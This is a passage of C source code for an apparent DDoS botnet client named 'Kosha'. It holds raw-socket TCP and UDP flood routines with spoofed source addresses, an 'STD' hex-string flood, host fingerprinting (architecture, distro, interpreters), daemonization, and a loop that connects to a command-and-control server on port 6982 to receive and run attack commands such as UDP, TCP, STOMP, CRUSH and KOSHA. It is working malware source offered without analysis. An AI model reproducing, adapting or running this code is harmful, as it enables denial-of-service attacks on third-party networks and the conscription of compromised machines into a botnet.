    tcph->ack_seq = 0;
    tcph->doff = 5;

    if(!strcmp(flags, "all"))
    {
        tcph->syn = 1;
        tcph->rst = 1;
        tcph->fin = 1;
        tcph->ack = 1;
        tcph->psh = 1;
    } else {
        unsigned char *pch = strtok(flags, ",");
        while(pch)
        {
            if(!strcmp(pch,         "syn"))
            {
                tcph->syn = 1;
            } else if(!strcmp(pch,  "rst"))
            {
                tcph->rst = 1;
            } else if(!strcmp(pch,  "fin"))
            {
                tcph->fin = 1;
            } else if(!strcmp(pch,  "ack"))
            {
                tcph->ack = 1;
            } else if(!strcmp(pch,  "psh"))
            {
                tcph->psh = 1;
            } else {
            }
            pch = strtok(NULL, ",");
        }
    }

    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);

    iph->check = csum ((unsigned short *) packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    while(1)
    {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        iph->saddr = htonl( getRandomIP(netmask) );
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        if(i == pollRegister)
        {
            if(time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}
void astd(unsigned char *ip, int port, int secs) 
{
        int std_hex;
        std_hex = socket(AF_INET, SOCK_DGRAM, 0);
        time_t start = time(NULL);
        struct sockaddr_in sin;
        struct hostent *hp;
        hp = gethostbyname(ip);
        bzero((char*) &sin,sizeof(sin));
        bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
        sin.sin_family = hp->h_addrtype;
        sin.sin_port = port;
        unsigned int a = 0;
        while(1)
        {
                char *hexstring[] = {"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"};
                if (a >= 50)
                {
                        send(std_hex, hexstring, std_packets, 0);
                        connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
                        if (time(NULL) >= start + secs)
                        {
                                close(std_hex);
                                _exit(0);
                        }
                        a = 0;
                }
                a++;
        }
}
char *getArch() {
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "Arm4";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "Arm5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "Arm6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "Arm7";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "Mips";
    #elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "Mipsel";
    #elif defined(__sh__)
    return "Sh4";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "Ppc";
    #elif defined(__sparc__) || defined(__sparc)
    return "spc";
    #elif defined(__m68k__)
    return "M68k";
    #elif defined(__arc__)
    return "Arc";
    #else
    return "Unknown Architecture";
    #endif
}
char *getFiles()
{
        if(access("/usr/bin/python", F_OK) != -1){
        return "Python";
        }
        if(access("/usr/bin/python3", F_OK) != -1){
        return "Python3";
        }
        if(access("/usr/bin/perl", F_OK) != -1){
        return "Perl";
                } else {
        return "Unknown File";
        }
}
char *getDevice()
{
        if(access("usr/sbin/telnetd", F_OK) != -1){
        return "SSH";
        } else {
        return "Unknown Device";
        }
}
char *getPortz()
{
        if(access("/usr/bin/python", F_OK) != -1){
        return "22";
        }
        if(access("/usr/bin/python3", F_OK) != -1){
        return "22";
        }
        if(access("/usr/bin/perl", F_OK) != -1){
        return "22";
        }
        if(access("/usr/sbin/telnetd", F_OK) != -1){
        return "22";
        } else {
        return "Unknown Port";
        }
}
char *getDistro()
{
        if(access("/usr/bin/apt-get", F_OK) != -1){
        return "Ubuntu/Debian";
        }
        if(access("/usr/lib/portage", F_OK) != -1){
        return "Gentoo";
        }
        if(access("/usr/bin/yum", F_OK) != -1){
        return "REHL/Centos";
        }
        if(access("/var/lib/YaST2", F_OK) != -1){
        return "Open Suse";
        } else {
        return "Unknown Distro";
        }
}

//char *getSys() 
//{
//    #if defined(__gnu_linux__) || defined(__linux__) || defined(linux) || defined(__linux)
//    return "Linux";
//    #elif defined(__WINDOWS__)
//    return "Windows";
//    #elif defined(__gnu_linux__) || defined(__linux__) || defined(linux) || defined(__linux) || defined(__ANDROID__)
//    return "Android"
//    else
//    return "Unknown";
//    #endif
//}   
void processCmd(int argc, unsigned char *argv[])
{
        if(!strcmp(argv[0], "UDP"))
        {
                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                int packetsize = atoi(argv[5]);
                int pollinterval = (argc == 7 ? atoi(argv[6]) : 10);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *ip = strtok(ip, ",");
                        while(ip != NULL)
                        {
                                if(!listFork())
                                {
                                        audp(ip, port, time, spoofed, packetsize, pollinterval);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }
                        audp(ip, port, time, spoofed, packetsize, pollinterval);
                        close(mainCommSock);

                        _exit(0);
                }
        }
           
                if(!strcmp(argv[0], "STD"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *ip = strtok(ip, ",");
                        while(ip != NULL)
                        {
                                if(!listFork())
                                {
                                        astd(ip, port, time);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }
                        astd(ip, port, time);
                        _exit(0);
                }
        }        
        if(!strcmp(argv[0], "TCP"))
        {
                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                unsigned char *flags = argv[5];

                int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
                int packetsize = argc > 6 ? atoi(argv[6]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *ip = strtok(ip, ",");
                        while(ip != NULL)
                        {
                                if(!listFork())
                                {
                                        atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }
                        atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
                        close(mainCommSock);

                        _exit(0);
                }
        }
        if(!strcmp(argv[0], "STOMP"))
        {
        if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        unsigned char *flags = argv[5];
                int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
        int packetsize = argc > 6 ? atoi(argv[6]) : 0;
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *ip = strtok(ip, ",");
            while(ip != NULL)
            {
                                if(!listFork())
                                {
                                        astd(ip, port, time);
                                        audp(ip, port, time, spoofed, packetsize, pollinterval);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else { 
                        if (listFork()) { return; }
                        astd(ip, port, time);
                        audp(ip, port, time, spoofed, packetsize, pollinterval);
                        close(mainCommSock);
                        _exit(0);
                }
        }
              if(!strcmp(argv[0], "CRUSH"))
        {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
            { return;}
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            unsigned char *flags = argv[5];
            int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
            int packetsize = argc > 6 ? atoi(argv[6]) : 0;
                       int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
           int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL)
            {
                unsigned char *ip = strtok(ip, ",");
                while(ip != NULL)
                {
                    if(!listFork())
                    {
                        astd(ip, port, time);
                        atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
                        close(mainCommSock);
                        _exit(0);
                    }
                    ip = strtok(NULL, ",");
                }
            } else {
                if (listFork()) { return; }
                astd(ip, port, time);
                atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
                close(mainCommSock);
                _exit(0);
            }
        }
        if(!strcmp(argv[0], "KOSHA"))
        {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
            { return;}
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            unsigned char *flags = argv[5];
            int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
            int packetsize = argc > 6 ? atoi(argv[6]) : 0;
            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL)
            {
                unsigned char *ip = strtok(ip, ",");
                while(ip != NULL)
                {
                    if(!listFork())
                    {
                        astd(ip, port, time);
                        close(mainCommSock);
                        _exit(0);
                    }
                    ip = strtok(NULL, ",");
                }
            } else {
                if (listFork()) { return; }
                astd(ip, port, time);
                close(mainCommSock);
                _exit(0);
            }
        }
//        if(!strcmp(argv[0], "CRASH"))
//        {
//                if(argc < 6)
//                {
//
//                        return;
//                }
//
//                unsigned char *ip = argv[1];
//                int port = atoi(argv[2]);
//                int time = atoi(argv[3]);
//                int spoofed = atoi(argv[4]);
//
//                int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
//                int psize = argc > 5 ? atoi(argv[5]) : 0;
//
//                if(strstr(ip, ",") != NULL)
//                {
//                        unsigned char *ip = strtok(ip, ",");
//                        while(ip != NULL)
//                        {
//                                if(!listFork())
//                                {
//                                        rtcp(ip, port, time, spoofed, psize, pollinterval);
//                                        _exit(0);
//                                }
//                                ip = strtok(NULL, ",");
//                        }
//                } else {
//                        if (listFork()) { return; }
//
//                        atcp(ip, port, time, spoofed, psize, pollinterval);
//                        _exit(0);
//                }
//        }
//      if(!strcmp(argv[0], "HEX"))
//    {
//        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1)
//        {
//            return;
//        }
//        unsigned char *ip = argv[1];
//        int port = atoi(argv[2]);
//        int time = atoi(argv[3]);
//        int packetsize = atoi(argv[4]);
//        if(strstr(ip, ",") != NULL)
//        {
//            unsigned char *ip = strtok(ip, ",");
//            while(ip != NULL)
//            {
//                if(!listFork())
//                {
//                    astd(ip, port, time, packetsize);
//                    _exit(0);
//                }
//                ip = strtok(NULL, ",");
//            }
//        } else {
//            if (listFork()) { return; }
//            astd(ip, port, time, packetsize);
//            _exit(0);
//        }
//    }
    if(!strcmp(argv[0], "STOP"))
    {
        int killed = 0;
        unsigned long i;
        for (i = 0; i < numpids; i++) {
            if (pids[i] != 0 && pids[i] != getpid()) {
                kill(pids[i], 9);
                killed++;
            }
        }

        if(killed > 0)
        {
        } else {
        }

}}
int initConnection()
{
        unsigned char server[512];
        memset(server, 0, 512);
        if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
        else currentServer++;

        strcpy(server, KoshaProject[currentServer]);
        int port = 6982;
        if(strchr(server, ':') != NULL)
        {
                port = atoi(strchr(server, ':') + 1);
                *((unsigned char *)(strchr(server, ':'))) = 0x0;
        }

        mainCommSock = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(mainCommSock, server, port, 30)) return 1;

        return 0;
}

int main(int argc, unsigned char *argv[])
{
        if(SERVER_LIST_SIZE <= 0) return 0;

        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        getOurIP();
        pid_t pid1;
        pid_t pid2;
        int status;

        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        } else {
        }
        setsid();
        chdir("/");
        signal(SIGPIPE, SIG_IGN);

        while(1)
        {
                if(initConnection()) { sleep(5); continue; } 
                sockprintf(mainCommSock, "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] Marking \x1b[0;31m-> \x1b[1;37m[\x1b[0;31m%s\x1b[1;37m] \x1b[0;31mPort\x1b[1;37m:[\x1b[0;31m%s\x1b[1;37m] \x1b[0;31mDevice\x1b[1;37m:[\x1b[0;31m%s\x1b[1;37m] \x1b[0;31mType\x1b[1;37m:[\x1b[0;31m%s\x1b[1;37m] \x1b[0;31mArch\x1b[1;37m:[\x1b[0;31m%s\x1b[1;37m] \x1b[0;31mDistro\x1b[1;37m:\x1b[1;37m[\x1b[0;31m%s\x1b[1;37m]", inet_ntoa(ourIP), getPortz(), getDevice(), getFiles(), getArch(), getDistro());
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);
                        
                        unsigned char *message = commBuf;

                        if(*message == '!')
                        {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;

                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;

                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }

                                processCmd(paramsCount, params);

                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }

        return 0;
}
